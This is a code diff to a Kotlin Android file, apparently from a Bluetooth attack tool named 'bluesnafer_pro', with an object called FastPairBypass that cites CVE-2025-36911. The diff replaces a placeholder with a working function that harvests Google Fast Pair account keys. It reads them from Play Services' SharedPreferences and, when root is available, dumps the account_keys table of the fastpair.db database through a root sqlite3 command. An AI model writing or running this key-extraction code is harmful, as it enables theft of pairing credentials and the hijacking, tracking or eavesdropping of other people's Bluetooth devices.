@@ -2,6 +2,7 @@ package com.bluesnafer_pro
 
 import android.bluetooth.*
 import android.bluetooth.le.*
+import android.content.Context
 import android.os.ParcelUuid
 import java.io.*
 import java.util.*
@@ -269,12 +270,38 @@ object FastPairBypass {
      * (Requires system permissions or compromised device)
      */
     fun extractStoredKeys(context: android.content.Context): Map<String, Any> {
-        // This would normally require system-level access
-        // Placeholder for completeness
-        return mapOf(
-            "success" to false,
-            "message" to "Key extraction requires system privileges",
-            "cve" to "CVE-2025-36911"
-        )
+        return try {
+            // Intentar leer desde SharedPreferences (Fast Pair cache)
+            val prefs = context.getSharedPreferences("com.google.android.gms.fastpair", Context.MODE_PRIVATE)
+            val keys = mutableListOf<String>()
+            val allEntries = prefs.all ?: emptyMap()
+            for ((key, value) in allEntries) {
+                if (key.contains("account_key", ignoreCase = true) || key.contains("fastpair", ignoreCase = true)) {
+                    keys.add("$key=${value.toString().take(32)}")
+                }
+            }
+
+            // Intentar leer desde content provider si hay root
+            if (RootUtils.isRootAvailable()) {
+                val dbResult = RootUtils.execRoot("sqlite3 /data/data/com.google.android.gms/databases/fastpair.db \"SELECT * FROM account_keys\" 2>/dev/null")
+                if (dbResult.success && dbResult.output.isNotBlank()) {
+                    keys.addAll(dbResult.output.lines().filter { it.isNotBlank() }.map { "db_row: ${it.take(64)}" })
+                }
+            }
+
+            mapOf(
+                "success" to (keys.isNotEmpty()),
+                "keys" to keys,
+                "count" to keys.size,
+                "source" to if (RootUtils.isRootAvailable()) "preferences+db" else "preferences",
+                "message" to if (keys.isNotEmpty()) "Extracted ${keys.size} Fast Pair key(s)" else "No Fast Pair keys found"
+            )
+        } catch (e: Throwable) {
+            mapOf(
+                "success" to false,
+                "error" to (e.message ?: "Key extraction failed"),
+                "cve" to "CVE-2025-36911"
+            )
+        }
     }
 }
